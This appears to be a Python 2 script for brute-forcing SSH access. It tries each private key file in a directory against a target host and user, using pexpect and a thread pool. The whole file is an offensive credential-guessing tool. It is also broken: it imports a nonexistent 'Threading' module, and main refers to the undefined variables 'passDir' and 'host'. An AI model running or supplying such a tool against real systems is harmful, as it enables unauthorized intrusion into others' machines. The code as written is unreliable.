import pexpect
import optparse
import os

from Threading import *

maxConnections = 5

connection_lock = BoundedSemaphore(maxConnections)
Stop = False
Fails = 0

def connect(user, host, keyfile, release):

	global Stop
	global Fails

	try:
	
		perm_denied = 'Permission Denied'
		ssh_newkey = 'Are you sure you want to continue'
		conn_closed = 'Connection closed by remote host'
		opt = ' -o PasswordAuthentication=no'

		connstr = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt 

		child = pexpect.spawn(connstr)
		ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#',]) #should throw an error

		if ret == 2:

			print '[-] Adding Host to ~/.ssh/known_hosts'
			child.sendline('yes')
			connect(user, host, keyfile, False)

		elif ret == 3:

			print '[-] Connection Closed By Remote Host'
			Fails += 1

		elif ret > 3:

			print '[+]Success. ' + str(keyfile)
			Stop = True

	finally:
			if release: connection_lock.release()

def main():
	
	parser = optparse.OptionParser('usage%prog ' +\
			 '-H <target host> -u <user> -d <key directory>')
	parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
	parser.add_option('-u', dest='user', type='string', help='specify the user')
	parser.add_option('-d', dest='keyDir', type='string', help='specify directory with keys')

	(options, args) = parser.parse_args()

	tgtHost = options.tgtHost
	user 	= options.user
	keyDir = options.keyDir

	if (tgtHost == None) or (user == None) or (keyDir == None):
		print parser.usage
		exit(0)

	#brutefore with ssh keys in key directory
	for filename in os.listdir(passDir):
		
		if Stop:
			print '[*] Key Found'
			exit(0)

		if Fails > 5:
			print '[!] Exiting: Too Many Connection Closed By Remote Host'
			exit(0)

		connection_lock.acquire()
		fullpath = os.path.join(passDir, filename)
		print '[-] Testing Keyfile ' + str(fullpath)
		t = Thread(target=connect, args=(user, host, fullpath, True))
		child = t.start()

if __name__ == "__main__":
	main()












